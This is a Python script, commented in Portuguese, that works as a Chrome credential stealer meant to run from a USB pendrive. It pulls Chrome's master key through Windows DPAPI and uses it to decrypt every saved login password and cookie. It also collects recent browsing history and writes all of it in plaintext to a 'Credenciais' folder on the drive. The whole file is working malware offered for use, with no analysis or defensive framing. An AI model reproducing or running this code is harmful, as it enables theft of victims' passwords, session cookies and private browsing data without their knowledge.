import os
import sys
import time
import json
import base64
import sqlite3
import shutil
import win32crypt
from Crypto.Cipher import AES
from datetime import datetime

# ============================================================
# PASSO 1: DETECTA O PENDRIVE E CRIA A PASTA LÁ
# ============================================================
# Se for .exe, pega a pasta onde ele está
if getattr(sys, 'frozen', False):
    PASTA_ATUAL = os.path.dirname(sys.executable)
else:
    PASTA_ATUAL = os.path.dirname(os.path.abspath(__file__))

# CRIA A PASTA Credenciais DENTRO DO PENDRIVE (ou da pasta do .exe)
PASTA_SAIDA = os.path.join(PASTA_ATUAL, "Credenciais")
os.makedirs(PASTA_SAIDA, exist_ok=True)

# ARQUIVO DE LOG (dentro da pasta Credenciais)
LOG_FILE = os.path.join(PASTA_SAIDA, f"log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")

def log(texto):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(str(texto) + "\n")
    print(texto)

# ============================================================
# PASSO 2: FUNÇÕES DE COLETA
# ============================================================
def pegar_chave_mestra():
    usuario = os.getlogin()
    path = f"C:/Users/{usuario}/AppData/Local/Google/Chrome/User Data/Local State"
    if not os.path.exists(path):
        raise FileNotFoundError(f"Chrome não encontrado: {path}")
    with open(path, 'r', encoding='utf-8') as f:
        local = json.load(f)
    chave_enc = base64.b64decode(local["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(chave_enc, None, None, None, 0)[1]

def coletar_senhas(chave):
    log("  [+] Senhas...")
    usuario = os.getlogin()
    caminho = f"C:/Users/{usuario}/AppData/Local/Google/Chrome/User Data/Default/Login Data"
    if not os.path.exists(caminho):
        log("    [!] Chrome sem dados de login.")
        return []
    temp = os.path.join(PASTA_SAIDA, "temp_senhas.db")
    try:
        shutil.copyfile(caminho, temp)
    except Exception as e:
        log(f"    [!] Erro ao copiar: {e}")
        return []
    creds = []
    conn = sqlite3.connect(temp)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    for url, user, enc in cursor.fetchall():
        try:
            nonce = enc[3:15]
            cipher = enc[15:-16]
            tag = enc[-16:]
            aes = AES.new(chave, AES.MODE_GCM, nonce=nonce)
            senha = aes.decrypt_and_verify(cipher, tag).decode('utf-8')
            creds.append(f"URL: {url}\nUsuário: {user}\nSenha: {senha}\n")
        except:
            pass
    conn.close()
    os.remove(temp)
    log(f"    OK {len(creds)} senhas.")
    return creds

def coletar_cookies(chave):
    log("  [+] Cookies...")
    usuario = os.getlogin()
    caminho = f"C:/Users/{usuario}/AppData/Local/Google/Chrome/User Data/Default/Network/Cookies"
    if not os.path.exists(caminho):
        log("    [!] Cookies não encontrados.")
        return []
    temp = os.path.join(PASTA_SAIDA, "temp_cookies.db")
    try:
        shutil.copyfile(caminho, temp)
    except Exception as e:
        log(f"    [!] Erro ao copiar (Chrome aberto?): {e}")
        return []
    cookies = []
    conn = sqlite3.connect(temp)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    for host, nome, enc in cursor.fetchall():
        try:
            nonce = enc[3:15]
            cipher = enc[15:-16]
            tag = enc[-16:]
            aes = AES.new(chave, AES.MODE_GCM, nonce=nonce)
            valor = aes.decrypt_and_verify(cipher, tag).decode('utf-8')
            cookies.append(f"Host: {host}\nCookie: {nome}={valor}\n")
        except:
            pass
    conn.close()
    os.remove(temp)
    log(f"    OK {len(cookies)} cookies.")
    return cookies

def coletar_historico():
    log("  [+] Histórico...")
    usuario = os.getlogin()
    caminho = f"C:/Users/{usuario}/AppData/Local/Google/Chrome/User Data/Default/History"
    if not os.path.exists(caminho):
        log("    [!] Histórico não encontrado.")
        return []
    temp = os.path.join(PASTA_SAIDA, "temp_history.db")
    try:
        shutil.copyfile(caminho, temp)
    except Exception as e:
        log(f"    [!] Erro ao copiar: {e}")
        return []
    hist = []
    conn = sqlite3.connect(temp)
    cursor = conn.cursor()
    cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 100")
    for url, titulo in cursor.fetchall():
        hist.append(f"URL: {url}\nTítulo: {titulo}\n")
    conn.close()
    os.remove(temp)
    log(f"    OK {len(hist)} sites.")
    return hist

# ============================================================
# PASSO 3: MAIN – RODA TUDO E SALVA
# ============================================================
def main():
    log("="*60)
    log("COLETOR COMPLETO (SALVA NO PENDRIVE)")
    log(f"Data: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}")
    log(f"Usuário: {os.getlogin()}")
    log(f"Pasta de saída: {PASTA_SAIDA}")
    log("="*60)

    try:
        chave = pegar_chave_mestra()
        log("\n[OK] Chave obtida.")
    except Exception as e:
        log(f"[ERRO] {e}")
        return

    log("\n[+] Coletando dados...")
    dados = {
        "senhas": coletar_senhas(chave),
        "cookies": coletar_cookies(chave),
        "historico": coletar_historico()
    }

    nome = f"credenciais_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    caminho = os.path.join(PASTA_SAIDA, nome)

    with open(caminho, "w", encoding="utf-8") as f:
        f.write("="*80 + "\n")
        f.write("RELATORIO COMPLETO\n")
        f.write(f"Data: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n")
        f.write(f"Usuario: {os.getlogin()}\n")
        f.write("="*80 + "\n\n")
        for secao, itens in dados.items():
            f.write(f"[{secao.upper()}]\n")
            f.write("-"*40 + "\n")
            if itens:
                for item in itens:
                    f.write(item + "\n")
            else:
                f.write("Nenhum dado encontrado.\n")
            f.write("\n")

    try:
        shutil.copy(caminho, os.path.join(PASTA_ATUAL, nome))
        log(f"\n[OK] Relatório salvo em: {caminho}")
        log(f"[OK] Cópia na raiz do pendrive: {nome}")
    except Exception as e:
        log(f"[AVISO] {e}")

    log("\n" + "="*60)
    log("FIM DA EXECUÇÃO")
    time.sleep(3)

if __name__ == "__main__":
    main()
